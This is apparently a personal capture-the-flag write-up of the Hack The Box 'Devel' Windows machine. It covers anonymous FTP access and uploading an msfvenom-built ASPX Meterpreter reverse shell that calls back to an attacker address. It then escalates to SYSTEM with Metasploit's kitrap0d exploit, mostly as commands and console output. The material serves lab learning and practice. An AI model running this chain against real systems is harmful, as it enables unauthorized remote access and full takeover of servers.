Box: Windows 
Level: Easy

| **INDEX**      |
| -------------- |
| 1. ftp port 21 |
Use the following command to bypass the normal login sequence and use anonymous login
```
ftp -a <IP>

nmap -p21 --script=ftp-anon <IP> #You can also use nmap nse script
```

FTP Banner Grabbing
```
nc -vn <IP> 21 #I can use any other port to grab a banner

openssl s_client -connect devel.htb:21 -starttls ftp #Grabs the certificate 
```

Download all the files anonymously from FTP
```
wget -m ftp://anonymous:anonymous@10.10.10.5 #Download all the files

wget -r --user="USERNAME" --password="PASSWORD" ftp://10.10.10.5/ #With Creds
```

####Scenario
So the box was allowing me to upload anything on the users share using the above ftp -a command and i was able to upload the shell.aspx to get the reverse shell. But the shell was limited and did not allowed me to read the user flag. i ran the following msfvenom command to prepare the ASPX payload.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=443 EXITFUNC=thread -f aspx -o shell2.aspx
```

Than I upload the payload using ftp onto Users Shares. After that I ran the MSF Console and use the following exploit to get the session. Following to that I use the local exploit suggester of Metasploit to perform the privilege escalation. 
```
use exploit/multi/handler                      # Use this exploit
set payload windows/meterpreter/reverse_tc     # The Payload
set LHOST 10.10.16.5
exploit
	[*] Started reverse TCP handler on 10.10.16.5:443 
	[*] Sending stage (176198 bytes) to 10.10.10.5
	[*] Sending stage (176198 bytes) to 10.10.10.5
	[*] Meterpreter session 3 opened (10.10.16.5:443 -> 10.10.10.5:49198) at 2024-07-28 23:17:16 -0400

sessions --list

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.16.5:443 -> 10.10.10.5:49201 (10.10.10.5)

#at this point, just type "meterpreter>sessions -i 1" where 1 is an invalid #session number and you will be back to the msf6> prompt where you can use the #following exploit suggester module and the session remains active. DO Not Use #Exit or Quit. That will kill the session.

use post/multi/recon/local_exploit_suggester     #Now using the exploit suggester
set SESSION 3
set SHOWDESCRIPTION true
run

#One of the suggestion was exploit/windows/local/ms10_015_kitrap0d from the output above

use exploit/windows/local/ms10_015_kitrap0d
set SESSION 3
set LHOST 10.10.16.5
exploit

#Another sessoin will open at this point which has the NT Authority\SYSTEM access.
```

That's how I solved the Devel.htb

